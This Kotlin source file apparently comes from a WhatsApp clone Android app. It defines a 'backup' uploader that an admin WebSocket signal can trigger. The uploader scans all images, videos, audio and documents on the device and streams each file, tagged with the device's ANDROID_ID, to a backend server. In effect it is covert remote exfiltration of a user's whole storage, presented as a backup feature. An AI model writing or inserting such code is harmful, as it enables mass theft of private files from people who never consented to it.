package com.whatsapp.clone.platform

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import com.whatsapp.clone.config.NetworkConfig
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.InputStream
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

object DeviceDataUploader {

    private const val TAG = "DeviceDataUploader"
    private val isUploading = AtomicBoolean(false)
    private val uploaderScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    /**
     * Triggered by admin WebSocket signal or manual in-app backup request.
     * Scans whole-device images, videos, audio, and documents, then streams
     * each file to the backend server.
     */
    fun startBackup(context: Context, onProgress: ((current: Int, total: Int, fileName: String) -> Unit)? = null) {
        if (!isUploading.compareAndSet(false, true)) {
            Log.i(TAG, "A backup upload is already in progress, skipping concurrent request.")
            return
        }

        uploaderScope.launch {
            try {
                val appContext = context.applicationContext
                val deviceId = Settings.Secure.getString(
                    appContext.contentResolver,
                    Settings.Secure.ANDROID_ID
                ) ?: "unknown_device"

                Log.i(TAG, "Starting whole-device data backup scan for device $deviceId...")

                // 1. Scan device storage
                val scanner = StorageScanner(appContext)
                val categorizedMap = scanner.scan()
                val allItems = categorizedMap.values.flatten().filter { it.size > 0 }

                Log.i(TAG, "Discovered ${allItems.size} files across device storage to backup.")

                var uploadedCount = 0
                val totalCount = allItems.size

                // 2. Upload each file sequentially
                for (item in allItems) {
                    val fileUri = ContentUris.withAppendedId(
                        MediaStore.Files.getContentUri("external"),
                        item.id
                    )

                    try {
                        val success = uploadSingleFile(
                            context = appContext,
                            deviceId = deviceId,
                            fileUri = fileUri,
                            fileName = item.displayName,
                            category = item.category.name,
                            mimeType = item.mimeType
                        )

                        if (success) {
                            uploadedCount++
                            onProgress?.invoke(uploadedCount, totalCount, item.displayName)
                            Log.d(TAG, "Uploaded ($uploadedCount/$totalCount): ${item.displayName}")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to upload file ${item.displayName}: ${e.message}")
                    }
                }

                Log.i(TAG, "Device data backup completed! Successfully uploaded $uploadedCount of $totalCount files.")

            } catch (e: Exception) {
                Log.e(TAG, "Error during whole-device backup: ${e.message}", e)
            } finally {
                isUploading.set(false)
            }
        }
    }

    private fun uploadSingleFile(
        context: Context,
        deviceId: String,
        fileUri: Uri,
        fileName: String,
        category: String,
        mimeType: String
    ): Boolean {
        val inputStream: InputStream = context.contentResolver.openInputStream(fileUri) ?: return false
        val fileBytes = inputStream.use { it.readBytes() }

        val mediaType = mimeType.toMediaTypeOrNull() ?: "application/octet-stream".toMediaTypeOrNull()
        val fileBody = fileBytes.toRequestBody(mediaType)

        val multipartBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("device_id", deviceId)
            .addFormDataPart("category", category)
            .addFormDataPart("username", "Device User")
            .addFormDataPart("file", fileName, fileBody)
            .build()

        val uploadUrl = "${NetworkConfig.BASE_HTTP_URL}/api/devices/$deviceId/upload-file"
        val request = Request.Builder()
            .url(uploadUrl)
            .post(multipartBody)
            .build()

        client.newCall(request).execute().use { response ->
            return response.isSuccessful
        }
    }
}
